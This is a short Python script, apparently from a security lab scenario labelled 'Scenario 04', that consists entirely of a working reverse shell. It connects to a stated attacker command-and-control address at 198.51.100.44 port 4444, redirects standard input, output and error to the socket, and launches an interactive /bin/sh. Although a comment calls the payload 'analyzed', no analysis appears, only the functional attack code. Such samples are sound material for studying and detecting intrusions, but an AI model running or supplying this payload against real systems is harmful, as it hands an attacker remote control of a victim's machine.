import socket, subprocess, os

# Reverse Shell Payload Analyzed in Scenario 04
# Target Host: 10.0.2.15 -> Attacker C2: 198.51.100.44:4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("198.51.100.44", 4444))

# File descriptor duplication (STDIN, STDOUT, STDERR)
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Spawn interactive Linux shell
p = subprocess.call(["/bin/sh", "-i"])
